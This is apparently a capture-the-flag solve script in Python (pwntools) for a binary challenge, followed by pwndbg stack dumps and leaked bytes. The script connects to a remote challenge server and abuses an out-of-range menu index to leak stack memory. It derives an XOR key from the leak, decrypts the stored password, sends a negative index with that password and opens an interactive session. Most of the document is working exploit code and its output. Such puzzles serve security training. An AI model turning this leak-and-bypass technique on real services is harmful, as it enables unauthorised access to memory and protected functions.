from pwn import *
from ctftools.pwn.common import connect

exe = ELF("chall")
io = connect(exe, "34.146.186.1", 41778)

io.send(b'\x10' * 31)

stack = []
for i in range(32):
    io.sendlineafter(b'(0~2) >', str(i).encode())
    stack.append(io.recvline().strip())

stack[4]
stack[5]
stack[6]
stack[7]
key = xor(stack[8], b'\x10' * 8)
password = b''
for i in range(4, 8):
    password += xor(stack[i], key)
password = password[:32]
print(password)

io.sendlineafter(b'(0~2) >', str(-1).encode())
io.sendline(password)
io.interactive()

"""
key
0x5d2102f414a5 <main+144>    mov    qword ptr [rbp - 0x98], rax     [0x7ffc511a6a48] <= 0x6605a9a56815d678

00:0000│ rsp 0x7ffc511a6a40 ◂— 0xff000000
01:0008│-098 0x7ffc511a6a48 ◂— 0x6605a9a56815d678
02:0010│-090 0x7ffc511a6a50 ◂— 0xff00000000000000
03:0018│-088 0x7ffc511a6a58 ◂— 0xff00000000
04:0020│-080 0x7ffc511a6a60 ◂— 0x543a31746e6948 /* 'Hint1:T' */
05:0028│-078 0x7ffc511a6a68 ◂— 0x533a32746e6948 /* 'Hint2:S' */
06:0030│-070 0x7ffc511a6a70 ◂— 0x473a33746e6948 /* 'Hint3:G' */
07:0038│-068 0x7ffc511a6a78 ◂— 0

---
password
 ► 0x5d2102f4150c <main+247>    call   __isoc99_fscanf@plt         <__isoc99_fscanf@plt>
        stream: 0x5d21044e72a0 ◂— 0xfbad2488
        format: 0x5d2102f4205b ◂— 0x746e450073313325 /* '%31s' */
        vararg: 0x7ffc511a6a80 ◂— 1
pwndbg> stack
00:0000│ rsp 0x7ffc511a6a40 ◂— 0xff000000
01:0008│-098 0x7ffc511a6a48 ◂— 0x6605a9a56815d678
02:0010│-090 0x7ffc511a6a50 —▸ 0x5d21044e72a0 ◂— 0xfbad2488
03:0018│-088 0x7ffc511a6a58 ◂— 0xff00000000
04:0020│-080 0x7ffc511a6a60 ◂— 0x543a31746e6948 /* 'Hint1:T' */
05:0028│-078 0x7ffc511a6a68 ◂— 0x533a32746e6948 /* 'Hint2:S' */
06:0030│-070 0x7ffc511a6a70 ◂— 0x473a33746e6948 /* 'Hint3:G' */
07:0038│-068 0x7ffc511a6a78 ◂— 0
08:0040│-060 0x7ffc511a6a80 ◂— 'This-is-a-dummy-password!!!'
09:0048│-058 0x7ffc511a6a88 ◂— 'a-dummy-password!!!'
0a:0050│-050 0x7ffc511a6a90 ◂— 'password!!!'
0b:0058│-048 0x7ffc511a6a98 ◂— 0x212121 /* '!!!' */
---
input
08:0040│-060 0x7ffc511a6a80 ◂— 0x4b76c0881b7cbe2c
09:0048│-058 0x7ffc511a6a88 ◂— 0x4b7cc4c81d71fb19
0a:0050│-050 0x7ffc511a6a90 ◂— 0x277c6d21b66b708
0b:0058│-048 0x7ffc511a6a98 ◂— 0x6605a9a56834f759
0c:0060│-040 0x7ffc511a6aa0 ◂— 0x1010101010101010
... ↓     2 skipped
0f:0078│-028 0x7ffc511a6ab8 ◂— 0x10101010101010


08:0040│-060 0x7ffc511a6a80 ◂— 0x4b76c0881b7cbe2c
09:0048│-058 0x7ffc511a6a88 ◂— 0x4b7cc4c81d71fb19
0a:0050│-050 0x7ffc511a6a90 ◂— 0x277c6d21b66b708
0b:0058│-048 0x7ffc511a6a98 ◂— 0x6605a9a56834f759
0c:0060│ rdi 0x7ffc511a6aa0 ◂— 0x7615b9b57805c668
... ↓        2 skipped
0f:0078│-028 0x7ffc511a6ab8 ◂— 0x6615b9b57805c668


b'Hint1:T\x00'
b'Hint2:S\x00'
b'Hint3:G\x00'
b'\x00\x00\x00\x00\x00\x00\x00\x00'
b',\xbe|\x1b\x88\xc0vK'
b'\x19\xfbq\x1d\xc8\xc4|K'
b'\x08\xb7f\x1b\xd2\xc6w\x02'
b'Y\xf74h\xa5\xa9\x05f'
b'h\xc6\x05x\xb5\xb9\x15v'
b'h\xc6\x05x\xb5\xb9\x15v'
b'h\xc6\x05x\xb5\xb9\x15v'
b'h\xc6\x05x\xb5\xb9\x15f'
b'\x00\x00\x00\x00\x00\x00\x00\x00'
b"\x00v\xcc\xa0\xcb'\x91e"
b'\x00\x00\x00\x00\x00\x00\x00\x00'
b'\x00\x00\x00\x00\x00\x00\x00\x00'
b'\x01\x00\x00\x00\x00\x00\x00\x00'
b'\x90}\x8b6B~\x00\x00'
b'\x00\x00\x00\x00\x00\x00\x00\x00'
b'\x15\x14\xf4\x02!]\x00\x00'
b'\x00\x00\x00\x00\x01\x00\x00\x00'
b'\xf8k\x1aQ\xfc\x7f\x00\x00'
b'\x00\x00\x00\x00\x00\x00\x00\x00'
b'\x10\xfaT\x05\x8f\xfe\xa8w'
b'\xf8k\x1aQ\xfc\x7f\x00\x00'
b'\x15\x14\xf4\x02!]\x00\x00'
b'P=\xf4\x02!]\x00\x00'
b'@\x80\xaf6B~\x00\x00'
b'\x10\xfa\xb6\xd0\xbb\\P\x88'
b'\x10\xfa\xde\xff\x99\x93,\x8b'
b'\x00\x00\x00\x00B~\x00\x00'
b'\x00\x00\x00\x00\x00\x00\x00\x00'
"""